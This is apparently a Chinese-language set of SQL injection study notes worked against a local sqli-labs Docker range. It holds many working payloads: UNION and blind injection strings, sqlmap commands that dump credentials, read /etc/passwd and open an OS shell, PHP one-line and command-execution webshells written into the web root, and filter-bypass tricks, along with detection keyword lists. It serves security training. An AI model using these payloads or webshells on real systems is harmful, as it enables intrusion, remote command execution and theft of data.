## 搭建sqlilabs靶场

### docker搭建sqlilabs靶场

```bash
docker search sqli-labs
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 8088:80 --restart=always acgpiano/sqli-labs #开机自启

docker update --restart=no sqli-labs 		#取消容器开机自启
docker update --restart=always sqli-labs #启动开机自启
docker start sqli-labs #启动
```

![image-20240801161136631](https://image.201068.xyz/assets/19.SQL注入/image-20240801161136631.png)

#### 进入虚拟终端

```bash
docker exec -it sqli-labs /bin/bash
cat /etc/mysql/my.cnf
ls /var/www/html/
cat /var/www/html/sql-connections/db-creds.inc


mysql -u root
show databases;
use security;
show tables;
desc users;
select * from users;
```

![image-20240801162726842](https://image.201068.xyz/assets/19.SQL注入/image-20240801162726842.png)

![image-20240801163850647](https://image.201068.xyz/assets/19.SQL注入/image-20240801163850647.png)

![image-20240801162945726](https://image.201068.xyz/assets/19.SQL注入/image-20240801162945726.png)



#### 访问

http://192.168.70.14:8088

![image-20240801161214413](https://image.201068.xyz/assets/19.SQL注入/image-20240801161214413.png)

#### 重置靶场

![image-20240801161047108](https://image.201068.xyz/assets/19.SQL注入/image-20240801161047108.png)

### sqlmap

```bash
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch --dbs
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security --tables
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security -T users --column
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security -T users -C id,username,password --dump
```

![image-20240801170629854](https://image.201068.xyz/assets/19.SQL注入/image-20240801170629854.png)

![image-20240801170702240](https://image.201068.xyz/assets/19.SQL注入/image-20240801170702240.png)

![image-20240803112700602](https://image.201068.xyz/assets/19.SQL注入/image-20240803112700602.png)

![image-20240803112758011](https://image.201068.xyz/assets/19.SQL注入/image-20240803112758011.png)

## sql注入基础知识

### **SQL注入攻击的根源**

程序命令和用户数据（即用户输入）之间没有做到泾渭分明

#### 注入成功的基础

1. 1、相信用户输入的数据
2. 2、Sql语句的拼接

### **注入之前必须要做三件事情**

- 确定web应用程序所使用的技术
- 确定所有可能的输入方式
- 查找可以用于注入的用户输入

### **万能密码原理解析**

-  大家经常听到网站万能密码登录，
-  输入 `' or 1=1 --` 发现输入任何密码都可以登录成功

### **注入前的准备及注入漏洞检测**

-  捕捉报错信息
-  手工检测SQL注入点

 最常用的SQL注入点判断方法，是在网站中寻找如下形式的网页连接。

> - http:// www.*****. com/ ***.asp?id=x (ASP注入)
> - http:// www.*****. com/ ***.php?id=x (php注入).
> - http:// www.*****. com/ ***.jsp?id=x (jsp注入)
> - http:// www.*****. com/ ***.aspx?id=x (aspx注入)
> - http:// www.*****.com/index/new/id/8 伪静态。
> - http:// www.*****.com/index/new/php-8.html 伪静态

#### 最后修改时间

```
javascript:alert(document.lastModified)
```



### **注入前的准备及注入漏洞检测**

####  检测方法

1.  1.“**单引号**”法
2.  2.`and 1=1`和`1=2`法
3.  3.通过页面返回的**报错信息**,一般情况下页面报错会显示是什么数据库类型

### **SQL注入的分类**

####  **按照注入的网页功能类型分类**

1.  1、登录注入
2.  2、cms注入

####  **按照注入点值的属性分类**

1.  1、数值型
2.  2、字符串型

####  **基于从服务器返回的内容**

1.  1、有回显
2.  2、无回显

####  **按照注入的程度和顺序**

1.  1、一阶注入
2.  2、二阶注入

####  **其他业务场景**

-  Update注入
-  Insert注入
-  Delete注入
-  Like注入
-  Order by注入
-  宽字节注入
-  http头注入

### **Mysql注入知识复习**

#### information_schema

在`Mysql 5.0`以上的版本中，为了方便管理，默认定义了`information_schema`数据库，用来存储数据库元信息。

其中具有表`schemata`(数据库名)、`tables`(表名)、`columns`(列名或字段名)。

![image-20240802091506404](https://image.201068.xyz/assets/19.SQL注入/image-20240802091506404.png)

#### 命令

- • `user()`:查看当前Mysql登录用户名
- • `database():`查看当前使用Mysql数据库名
- • `version()`:查看当前Mysql版本
- • `@@version`
- • `@@basedir`
- • `length()` 字符串长度
- • `substring()`截取字符串
- • `ord` 返回ASCII码值
- • `concat` 连接字符串
- • `sleep(4)` 睡眠指定描述
- • `group_concat()` 查询结果放同一行
- • `limit m,n` 从m行开始，到m+n行。
- • `mid()`需要截取的字符串

#### 注释

- • `#`
- • `--空格`（%20）
- • `/**/`
- • **内联注释**:`/*!SQL语句*/`只有Mysql可以识别，常用来绕过WAF

例如:

```
select * from articles where id = id
```

• 使用内联注释注入:

```
select *from articles where id =-1 /*!union*//*!select*/
```

## GET 基于报错的 SQL 注入回显分析

通过在 URL 中修改对应的 `ID` 值，为**正常数字**、**大数字**、**字符**（**单引号**、**双引号**、**括号**）、**反斜杠**`/`来探测 URL 中是否存在注入点。

实验:`Sqli-Lab Less1~4`,GET 基于报错的 SQL 注入。

### **Less1 –基于字符串**

输入`?id=1'`

报错信息是

```
'1'' LIMIT 0,1 
```

推断 sql 语句是

```mysql
select login_name,password from admin where id =' id' ' limit 0,1
select login_name,password from admin where id =' ** ' limit 0,1
```



### **less2 -基于数字**

输入 `?id=1'`

报错信息是

```
' LIMIT 0,1 
```

推断 sql 语句是

```mysql
select login_name,password from admin where id = ** limit 0,1
```



### **less3 基于括号**

输入 `?id=1'`

报错信息是

```
'1'') LIMIT 0,1 
```

推断 sql 语句是

```
select login_name,password from admin where id =('id') limit 0,1
```

验证 http://192.168.70.14:8088

能够出现正确结果 或者使用`--%20`

### **Less4 基于双引号报错**

输入 `?id=1"`或者 `id=1\`

报错消息是：

```
"14"") LIMIT 0,1 ' 
```

推断 sql 语句是

```
select login_name,password from admin where id =("id") limit 0,1
```

## **GET 基于报错的 SQL 注入利用及流量分析**

### **1、** **利用 order by 判断字段数。**

```
http://192.168.70.14:8088/Less-1/?id=1' order by 3 --+
http://192.168.70.14:8088/Less-1/?id=1' order by 4 --+
```

![image-20240802211019630](https://image.201068.xyz/assets/19.SQL注入/image-20240802211019630.png)

![image-20240802211104090](https://image.201068.xyz/assets/19.SQL注入/image-20240802211104090.png)

### **2、** **利用 union select 联合查询，获取库名和表名。**

#### 查询显示位

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,2,3 --+
```

![image-20240802211125642](https://image.201068.xyz/assets/19.SQL注入/image-20240802211125642.png)

查询 2，3 字段

#### 获得用户和数据库名

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,user(),database() --+
```

![image-20240802211206685](https://image.201068.xyz/assets/19.SQL注入/image-20240802211206685.png)

#### 看 version 版本

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,version(),database() --+
```

![image-20240802211432008](https://image.201068.xyz/assets/19.SQL注入/image-20240802211432008.png)

#### 具体开始探测

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

![image-20240802211608731](https://image.201068.xyz/assets/19.SQL注入/image-20240802211608731.png)

### **3、** **利用 union select 联合查询，获取字段名。**

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

![image-20240802211702988](https://image.201068.xyz/assets/19.SQL注入/image-20240802211702988.png)

### **4、** **利用 union select 联合查询，获取字段值**

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+
```

![image-20240802211733747](https://image.201068.xyz/assets/19.SQL注入/image-20240802211733747.png)

### **5、** **select into outfile 写一句话木马**

#### 写一句话木马

```bash
http://192.168.70.14:8088/Less-4/?id=-1") union select 1,"<?php eval($_POST['xxx']);?>",3 into outfile '/var/www/html/shell.php' --+
```

![image-20240802170158938](https://image.201068.xyz/assets/19.SQL注入/image-20240802170158938.png)

#### 配置

```bash
mysql> show variables like 'secure_file_priv';
chmod 777 /var/www/html
```

![image-20240802212255609](https://image.201068.xyz/assets/19.SQL注入/image-20240802212255609.png)

#### 蚁剑链接

![image-20240802170352310](https://image.201068.xyz/assets/19.SQL注入/image-20240802170352310.png)

![image-20240802170443917](https://image.201068.xyz/assets/19.SQL注入/image-20240802170443917.png)

#### 分析蚁剑流量

蚁剑流量特征

antsword

- @ini _set("display","0");
- @set time limit(0)
- base64编码

### 5.1、慢日志写入一句话木马

##### windows mysql设置

```bash
[mysqld]

slow_query_log=1 # 启动慢查询日志
```

##### 获取数据库用户名密码

```bash
?id=0' union select 1,group_concat(user,0x3a,authentication_string),3 from mysql.user--+
```

![image-20240802172357081](https://image.201068.xyz/assets/19.SQL注入/image-20240802172357081.png)

##### 查看慢日志状态和路径

```bash
show variables like '%slow_query_log%';
```

![image-20240803100922532](https://image.201068.xyz/assets/19.SQL注入/image-20240803100922532.png)

##### 启动慢日志

```bash
set global slow_query_log=1;
set global slow_query_log_file='/var/www/html/shell.php';

show variables like '%char%';						#查看字符集路径
show variables like '%slow_query_log%';
show variables like '%log%';
```

![image-20240803101406917](https://image.201068.xyz/assets/19.SQL注入/image-20240803101406917.png)

![image-20240803101733059](https://image.201068.xyz/assets/19.SQL注入/image-20240803101733059.png)

##### 查看默认时间

```bash
show variables like '%long_query_time%';
```

![](https://image.201068.xyz/assets/19.SQL注入/image-20240803102822112.png)

##### 写一句话木马

```bash
select '<?php @eval($_POST["xxx"]);?>' or sleep(10);
```

![image-20240803103106313](https://image.201068.xyz/assets/19.SQL注入/image-20240803103106313.png)

![image-20240803103526942](https://image.201068.xyz/assets/19.SQL注入/image-20240803103526942.png)

##### 蚁剑连接

```bash
http://192.168.70.14:8088/shell.php
xxx
```

![image-20240803103624862](https://image.201068.xyz/assets/19.SQL注入/image-20240803103624862.png)

![image-20240803103756911](https://image.201068.xyz/assets/19.SQL注入/image-20240803103756911.png)

### 5.2、一般日志

一般查询日志 记录所有客户端发给数据库服务器的SQL语句 增删改查.....

`general log`

```bash
show variables like '%general_log%';

set global general_log=1;
set global general_log_file='/var/www/html/shell1.php';

select '<?php @eval($_POST["xxx"]);?>';

chmod o+rw /var/www/html/shell1.php
```

#### 查询一般日志的状态

![image-20240803105252493](https://image.201068.xyz/assets/19.SQL注入/image-20240803105252493.png)

#### 开启一般日志，写入webshell

![image-20240803113846495](https://image.201068.xyz/assets/19.SQL注入/image-20240803113846495.png)

![image-20240803113913079](https://image.201068.xyz/assets/19.SQL注入/image-20240803113913079.png)

#### 赋予其他人查看权限

![image-20240803141527679](https://image.201068.xyz/assets/19.SQL注入/image-20240803141527679.png)

#### 蚁剑连接

```bash
http://192.168.70.14:8088/shell1.php
xxx
```

![image-20240803141704959](https://image.201068.xyz/assets/19.SQL注入/image-20240803141704959.png)

![image-20240803141742229](https://image.201068.xyz/assets/19.SQL注入/image-20240803141742229.png)

### **6、** **利用 load_file 读敏感文件**

```
http://192.168.70.14:8088/Less-1/?id=-1' union select 1,2,load_file('/etc/passwd') --+
```

![image-20240802212549223](https://image.201068.xyz/assets/19.SQL注入/image-20240802212549223.png)

### **7、** **流量分析**

#### 流量敏感关键字：

- `union`
- `select`
- `group_concat`
- `into outfile`
- `load_file()`

#### 木马流量敏感关键字

```
<?php @eval($_POST["xxx"]); ?>
```

#### 相应 webshell 管理工具流量

比如菜刀流量、冰歇流量、蚁剑流量、哥斯拉的流量

## **利用 sqlmap 探测 get 类型注入**

### **1、探测数据库名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --dbs 
```

![image-20240801170629854](https://image.201068.xyz/assets/19.SQL注入/image-20240801170629854.png)

### **2、探测表名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security --tables 
```

![image-20240801170702240](https://image.201068.xyz/assets/19.SQL注入/image-20240801170702240.png)

### **3、探测字段名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security -T users --columns 
```

![image-20240803112700602](https://image.201068.xyz/assets/19.SQL注入/image-20240803112700602.png)

### **4、探测 字段值**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security -T users -C id,username,password --dump 
```

![image-20240803112758011](https://image.201068.xyz/assets/19.SQL注入/image-20240803112758011.png)

### **5、读取敏感文件**

> --file-read

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --file-read '/etc/passwd' 
cat /root/.local/share/sqlmap/output/192.168.70.14/files/_etc_passwd
```

![image-20240803113005155](https://image.201068.xyz/assets/19.SQL注入/image-20240803113005155.png)

![image-20240803113103126](https://image.201068.xyz/assets/19.SQL注入/image-20240803113103126.png)

### **6、上传一句话木马**

> --file-write
>
> --file-dest

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --file-write '/root/tools/webshell/xxx.php' --file-dest '/var/www/html/ma.php' 
```

![image-20240803144143433](https://image.201068.xyz/assets/19.SQL注入/image-20240803144143433.png)

#### 蚁剑连接

```
http://192.168.70.14:8088/ma.php
xxx
```

![image-20240803144320050](https://image.201068.xyz/assets/19.SQL注入/image-20240803144320050.png)

![image-20240803144346544](https://image.201068.xyz/assets/19.SQL注入/image-20240803144346544.png)

### sqlmap代理

> --purge	 #清空缓存
>
> --proxy http://127.0.0.1:8080     #代理

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --dbs --purge --proxy 127.0.0.1:8080
```

![image-20240803150017232](https://image.201068.xyz/assets/19.SQL注入/image-20240803150017232.png)

#### burp抓包

![image-20240803150100455](https://image.201068.xyz/assets/19.SQL注入/image-20240803150100455.png)

![image-20240803150343338](https://image.201068.xyz/assets/19.SQL注入/image-20240803150343338.png)

### 指定插件 --technique

> `BEUSTQ`
>
> 1. `B` - Boolean-based blind SQL injection（**布尔型盲注**）
> 2. `E` - Error-based SQL injection（**报错型注入**）
> 3. `U` - UNION query SQL injection（**联合查询注入**）
> 4. `S` - Stacked queries SQL injection（**堆叠注入**）
> 5. `T` - Time-based blind SQL injection（**基于时间的盲注**）
> 6. `Q` - Inline queries SQL injection（**内联查询注入**）

> --technique T 	#时间盲注
>
> --technique B        #布尔盲注

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --technique T --dbs 
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --technique B --dbs 
```



### 交互式shell

> --os-shell
>
> --os-cmd=whoami

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --os-shell 
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --os-cmd=whaomi

4
2
/var/www/html
```

![image-20240803094110561](https://image.201068.xyz/assets/19.SQL注入/image-20240803094110561.png)

![image-20240803094300485](https://image.201068.xyz/assets/19.SQL注入/image-20240803094300485.png)

![image-20240803094517464](https://image.201068.xyz/assets/19.SQL注入/image-20240803094517464.png)

```php
<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);$z=@ini_get("disable_functions");if(!empty($z)){$z=preg_replace("/[, ]+/",',',$z);$z=explode(',',$z);$z=array_map("trim",$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f("system")){ob_start();system($c);$w=ob_get_clean();}elseif(f("proc_open")){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f("shell_exec")){$w=shell_exec($c);}elseif(f("passthru")){ob_start();passthru($c);$w=ob_get_clean();}elseif(f("popen")){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f("exec")){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}echo"<pre>$w</pre>";?>
```



> 上传码：http://192.168.70.14:8088/tmpukkuq.php
>
> webshell：http://192.168.70.14:8088/tmpbhkcj.php
>
> 连接密码：cmd

![image-20240803094323468](https://image.201068.xyz/assets/19.SQL注入/image-20240803094323468.png)

![image-20240803094340477](https://image.201068.xyz/assets/19.SQL注入/image-20240803094340477.png)

![image-20240803094828413](https://image.201068.xyz/assets/19.SQL注入/image-20240803094828413.png)

## **post 基于错误的注入及**流量分析

### **1**、post **基于错误单引号注入回显分析**

注入点位置发生了变化，在浏览器中已经无法直接进行查看与修改。当然可以借助对应的插件可以完成修改任务。以 `Sqli-Lab Less11` 为例。

用 burpsuite 抓 `Less11` 的包，发送 repeate 修改

```mysql
Select username,password from db where username='admin' and password='123456'
```

但是如果我们加上`\`

```mysql
Select username,password from db where username='admin\' and password='123456'
```

因为\’被认为是转义字符，所以，红色部分是一个字符串，所以 123456 部分出错

漏洞利用

闭合 123456 的单引号`'`，然后加入万能密码，然后注释 发现登录成功

```bash
uname=admin&passwd=123456' or 1=1 --+ submit=Submit
```

#### 1、查找闭合方式

```
http://192.168.70.14:8088/Less-11/

passwd=1&submit=Submit&uname=admin'#
```

单引号`'`闭合

![image-20240803201636994](https://image.201068.xyz/assets/19.SQL注入/image-20240803201636994.png)

#### 2、判断列数

```
passwd=1&submit=Submit&uname=admin' order by 2#
passwd=1&submit=Submit&uname=admin' order by 3#
```

![image-20240803201726666](https://image.201068.xyz/assets/19.SQL注入/image-20240803201726666.png)

![image-20240803201748168](https://image.201068.xyz/assets/19.SQL注入/image-20240803201748168.png)

有`2`列字段，3列就报错了

#### 3、查看显示位

```
passwd=1&submit=Submit&uname=0' union select 1,2#
```

![image-20240803201952965](https://image.201068.xyz/assets/19.SQL注入/image-20240803201952965.png)

`1`和`2`都是显示位

#### 4、获取数据库名

```
passwd=1&submit=Submit&uname=0' union select version(),database()#
```

![image-20240803202246544](https://image.201068.xyz/assets/19.SQL注入/image-20240803202246544.png)

#### 5、获取表名

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![image-20240803202320057](https://image.201068.xyz/assets/19.SQL注入/image-20240803202320057.png)

#### 6、获取字段名

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#
```

![image-20240803202355435](https://image.201068.xyz/assets/19.SQL注入/image-20240803202355435.png)

#### 7、获取字段值

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(username,0x3a,password) from security.users#
```

![image-20240803202422982](https://image.201068.xyz/assets/19.SQL注入/image-20240803202422982.png)

### **2**、**post **基于错误的双引号注入回显利用

Bp 抓包修改 发现 sql 语句错误

闭合`")`加上万能密码 `or 1=1` 加上 `--+`，正确登录

### **3**、**Sqlmap** **进行** **post** **注入测试**

#### 注入测试方法

复制 `Burpsuite` 截断的 HTTP 请求数据包到文本文件中，使用 `Sqlmap -r` 文件路径`-p` 指定探测参数。

第一步 bp 抓包 获得 `Less11` 的包，然后将 raw 格式 http 数据赋值到`2.txt` 文本文件中

#### -r

> -r

##### 0、burpsuit抓包Less-11

保存为`2.txt`,给`passwd`侯标记`*`

```bash
POST /Less-11/ HTTP/1.1
Host: 192.168.70.14:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://192.168.70.14:8088
Connection: close
Referer: http://192.168.70.14:8088/Less-11/
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admiin&submit=Submit
```

![image-20240803203312388](https://image.201068.xyz/assets/19.SQL注入/image-20240803203312388.png)

![image-20240803203616594](https://image.201068.xyz/assets/19.SQL注入/image-20240803203616594.png)

![image-20240803203647949](https://image.201068.xyz/assets/19.SQL注入/image-20240803203647949.png)

##### **1、探测数据库名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -dbs
```

![image-20240803204804463](https://image.201068.xyz/assets/19.SQL注入/image-20240803204804463.png)

##### **2、探测表名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security --tables 
```

![image-20240803204823003](https://image.201068.xyz/assets/19.SQL注入/image-20240803204823003.png)

##### **3、探测字段名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security -T users --columns 
```

![image-20240803204845023](https://image.201068.xyz/assets/19.SQL注入/image-20240803204845023.png)

##### **4、探测字段值**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security -T users -C id,username,password --dump 
```

![image-20240803204903319](https://image.201068.xyz/assets/19.SQL注入/image-20240803204903319.png)

##### **5、读取敏感文件**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch --file-read '/etc/passwd' 
cat /root/.local/share/sqlmap/output/192.168.70.14/files/_etc_passwd
```

![image-20240803204944668](https://image.201068.xyz/assets/19.SQL注入/image-20240803204944668.png)

##### **6、上传一句话木马**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch --file-write '/root/tools/webshell/xxx.php' --file-dest '/var/www/html/muma.php' 
```

![image-20240803205134173](https://image.201068.xyz/assets/19.SQL注入/image-20240803205134173.png)

![image-20240803205159224](https://image.201068.xyz/assets/19.SQL注入/image-20240803205159224.png)

###### 蚁剑连接

```
192.168.70.14:8088/muma.php
xxx
```

![image-20240803205352457](https://image.201068.xyz/assets/19.SQL注入/image-20240803205352457.png)

![image-20240803205512255](https://image.201068.xyz/assets/19.SQL注入/image-20240803205512255.png)

#### --data

> --data

```bash
sqlmap -u "http://192.168.70.14:8088/Less-12/" --batch --data "uname=admin&passwd=123456*&submit=Submit" --purge --dbs 
```

![image-20240803162156315](https://image.201068.xyz/assets/19.SQL注入/image-20240803162156315.png)

### 4、流量特征分析

请求体位置含有注入语句

#### 流量敏感关键字

- order by
- union
- select
- group_concat
- into outfile
- load_file()

## **Sql 注入基于时间的盲注及流量分析**

### **1.Sql 注入盲注基础**

`Blind SQL`(**盲注**)是注入攻击的其中一种,向数据库发送 true 或 false 这样的问题,并根据应用程序返回的信息判断结果.这种攻击的出现是因为应用程序配置为只显示常规错误,但并没有解决 SQL 注入存在的代码问题。

演示盲注问题。当攻击者利用 SQL 注入漏洞进行攻击时,有时候 web 应用程序会显示,后端数据库执行 SQL 查询返回的错误信息. Blind SQL (盲注)与常规注入很接近,不同的是数据库返回数据的检索方式.若数据库没有输出数据到web 页面,攻击者会询问一些列的 true 或 false 问题,强制从数据库获取数据。

盲注可以分为基于**布尔的盲注**和基于**时间的盲注**

### **2.基于时间的盲注原理及展示**

延时注入，用的最多的注入

常用的判断语句:

```
' and if(1=0,1, sleep(10)) --+

" and if(1=0,1, sleep(10)) --+

) and if(1=0,1, sleep(10)) --+

') and if(1=0,1, sleep(10)) --+

") and if(1=0,1, sleep(10)) --+
```

> 利用 if(条件,0,1)函数，当条件为真，返回 1，假则返回 sleep（10）

#### Sqli-lab 9-10 实验 基于时间的盲注

```
http://localhost/sqli-labs-master/Less-9/?id=1' and if(1=1,sleep(6),1) --+
```

在这里是`' and 1=1` 为真，延时 `6` 秒，假则直接返回（注入点和注入语句基本确定可使用）

##### Less-9 执行范例：

```
192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(10),1) --+
```

当数据库名第一个字母的 `ascii` 码等于 `115` 时，执行 `sleep(10)`函数等待 10 秒。

否则没动作

```
http://192.168.70.14:8088/Less-9/?id=1%27%20and%20if(ascii(substr(database(),1,1))=115,sleep(10),1)%20--+
```

### **3.get 基于时间的盲注应用**

#### 爆数据库

```
http://192.168.70.14：8088/Less-9/?id=1' and if(ascii(substr(database(),1,1))>95,sleep(6),1)%23
```

利用**二分法**猜解数据库的每一个数据

二分法以此类推，116时直接返回页面。说明数据库第一个数据的ascii码为115，即为 `s`，后面的数据同理，最后数据库名为‘`security`’

当然在爆数据库前最好**先爆数据库长度**

当然实际环境中，**很多常用的函数是会被过滤的，需要绕过**。

### **4.post 基于时间的盲注应用**

在存在注入点 post 提交的参数后加入类似 `and if(length(database())>5,sleep(5),null) ` #如果执行的页面响应时间大于 5秒，那么看肯定就存在注入，并且对应的 sql 语句执行

#### 演示 Less-15

```
uname=admin' and if(length(database())>5,sleep(5),null) --+&passwd=admin123456&submit=Submit
```

如果数据据名称大于 5，则等待 5 秒，可以看到，执行时间大于 5 秒，说明数据库名称大于 5

### **5.基于时间的盲注的流量分析**

#### 流量关键字

- and if
- sleep
- length
- ascii
- ord
- substr
- mid

## **基于布尔的盲注**

### **一、判定是否有注入点**

利用页面的细微变化来判定是否有注入点

### **二、常用 payload**

基于布尔型的盲注，我们通常采用下面的办法猜解字符串.

> length(databse());
>
> substr(databse(),1,1);
>
> ascii(substr(database(),1,1));
>
> ascii(substr(database(),1,1))>N;
>
> ascii(substr(database(),1,1))=N;
>
> ascii(substr(database(),1,1))<N;

### **三、Get 基于布尔的盲注**

####  Sqli-Lab 8 实验演示

分别输入`/?id=1` 和`/?id=1’`或者`/?id=1\`，返回的结果情况

然后利用布尔盲注，测试数据库名字的长度

```
http://192.168.70.14:8088/Less-8/?id=1%27%20and%20length(database())=8%20--+
```

出现 `you are in` 则证明盲注成功

相反的如果是

```
http://192.168.70.14:8088/Less-8/?id=1%27%20and%20length(database())=9%20--+
```

### **四、Post 基于布尔的盲注**

在存在的注入点 POST 提交的参数后，加入 `if` 判断正确或者错误的语句

> length(databse());
>
> substr(databse(),1,1);
>
> ascii(substr(database(),1,1))>N;
>
> ascii(substr(database(),1,1))=N;
>
> ascii(substr(database(),1,1))<N;

Payload//如果不知道用户名用 `or`，但**要求用户名要做到不正确**，找一个最不像用户名的用户名

```
uname=admin' and (length(database())>7) --+&passwd=admin123456&submit=Submit
uname=dddd' or length(database())>7 -- &passwd=admin&submit=Submit
```

### **五、基于布尔的盲注的流量分析**

#### 流量关键字

- and
- length
- ascii
- ord
- substr
- mid

## **利用 sqlmap 探测盲注**

### **一、利用** **sqlmap** **探测**get **基于时间盲注**

查看 sqlmap 的帮助信息

```
sqlmap -h 
```

![image-20240803171031277](https://image.201068.xyz/assets/19.SQL注入/image-20240803171031277.png)

> B 表示布尔盲注，
>
> T 表示时间盲注(延迟注入），
>
> E 表示报错注入,
>
> U 表示联合查询注入，
>
> S 表示堆查询注入

`--technique T` 设置为只基于时间的探测技术

```
sqlmap -u "http://192.168.70.14:8088/Less-9/?id=1" --technique T --dbs --batch
sqlmap -u "http://192.168.70.14:8088/Less-9/?id=1" --batch --technique T --proxy "http://127.0.0.1:8080" --dbs
```

### **二、利用** **sqlmap** **探测** **post** **盲注**

获得 http 请求生成 `target.txt` 文件



使用基于**时间**技术的 sqlmap 探测

```
sqlmap -r target.txt --batch --technique T -p uname --dbs
```

类似可以使用**布尔**技术的 sqlmap 探测

```
sqlmap -r target.txt --batch --technique B -p uname --dbs
```

但没有探测出来，这个时候就需要我们采用更多的技术去探测

### 三 sqlmap 盲注的流量特征

#### 1、手工盲注的流量特征类似 

- if 
- sleep 
- select 布尔表达式的判定 数据
- 库源信息的流量特征

#### 2、大量的同源注入请求 sqlmap 特征

## **Sql 注入的绕过原理**

### **1.**大小写绕过

如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如: and 过滤。当然这种过滤只是发现关键字出现，并不会对关键字处理。

通过修改**关键字内字母大小写**来绕过过滤措施。

例如:`AnD 1=1`

例如:在进行探测当前表的字段数时,使用 order by 数字进行探测。如果过滤了 `order` ，可以使用 `OrdER` 来进行绕过。

如果在程序中设置出现**关键字之后替换为空**，那么 SQL 注入攻击也不会发生。

对于这样的过滤策略可以

#### 实验：

Mysql 练习大小写绕过语句

```
Select * from  ** oRdEr by 1
```

### **2** **双写绕过**

使用双写绕过。因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。

比如 `union` 在程序员处理时被替换为**空**，那需要我们可以尝试把 `union` 改写为Un**union**ion 红色部分替换为空，则剩下的依然为空

还可以结合大小写过滤一起使用

### **3.**编码绕过

可以利用网络中的 URL 在线编码，绕过 SQL 注入的过滤机制。

http://tool.chinaz.com/Tools/urlencode.aspx

### **4.**内联注释绕过

在 Mysql 中内容注释中的内容可以被当作 SQL 语句执行。

#### 实验：

Mysql 中执行

```
/*!select*/ * from admin
```

## **绕过过滤 and 和 or 的 sql 注入及流量分析**

### **1. 基础知识介绍**

1. 1、Mysql 中的**大小写**不敏感，大写与小写一样。
2. 2、Mysql 中的**十六进制**与 `URL` 编码。
3. 3、符号和关键字替换 `and -- &&`、`or -- ||`。
4. 4、内联注释与多行注释`/*! 内联注释*/ /* 多行注释*/`

```
preg_ replace(mixed $pattern，mixed $replacement，mixed $subject)
```

执行一个正则表达式的搜索和替换。

> $pattern:要搜索的模式，可以是字符串或一个字符串数组
>
> $replacement:用于替换的字符串或字符串数组。
>
> $subject:要搜索替换的目标字符串或字符串数组。

### **2. 去除 and 和 or 的代码分析**

Less-25 的代码

### **3. 绕过去除 and 和 or 的 SQL 注入**

#### Sqli-Lab 25 绕过策略

1. 1、**大小写**变形，`Or,OR,oR,OR,And,ANd,aND` 等 代码中大小写不敏感都被剔除
2. 2、在这两个敏感词汇中添加**注释**，例如: `a/**/nd` ，双写绕过 `oorr`
3. 3、利用符号替代`--and --&&`  `--or --||`

#### Less 25 绕过演示

首先发现注入类型是**数值型**注入发现

绕过 方法 1 行不通我们可以试试方法 2

```
http://127.0.0.1:8088/Less-25a/?id=1%20Anandd%201=1
```

范例我们可以试试方法 3

```
http://127.0.0.1:8088/Less-25a/?id=1%20&&1=1
```

### **4. 流量分析**

#### 流量特征

- 大小写，双写流量AnD 
- Or 
- aandnd ANanDD 
- oorr 
- OoRr
- &&，||流量

## **绕过过滤空格的 sql 注入**

### **1. 基础知识介绍**

-  Mysql 中的大小写不敏感，大写与小写一样。
-  Mysql 中的十六进制与 URL 编码。
